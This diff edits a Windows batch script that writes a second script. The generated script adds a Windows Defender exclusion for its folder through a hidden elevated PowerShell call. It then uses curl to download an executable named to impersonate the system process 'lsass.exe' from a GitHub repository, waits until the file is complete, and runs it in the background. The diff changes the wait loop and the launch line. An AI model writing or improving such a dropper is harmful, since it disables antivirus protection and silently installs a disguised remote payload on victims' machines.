@@ -18,14 +18,14 @@ if not exist "%folderPath%" mkdir "%folderPath%"
     echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1
     echo curl -L -o "%exeFile%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1
 
-    :: Wait for the file to finish downloading
     echo :checkFile
-    echo if not exist "%exeFile%" (timeout /t 2 /nobreak ^>nul & goto checkFile)
-    echo for %%%%F in ("%exeFile%") do set filesize=%%%%~zF
+    echo timeout /t 2 /nobreak ^>nul
+    echo if not exist "%exeFile%" goto checkFile
+    echo for %%%%F in ("%exeFile%") do set "filesize=%%%%~zF"
     echo if "!filesize!"=="0" (timeout /t 2 /nobreak ^>nul & goto checkFile)
 
-    :: Run the EXE and keep the batch script alive
-    echo start /b "%exeFile%"
+    :: Run the EXE in the background
+    echo start "" "%exeFile%"
     echo exit /b 0
 ) > "%batchScript%"
 
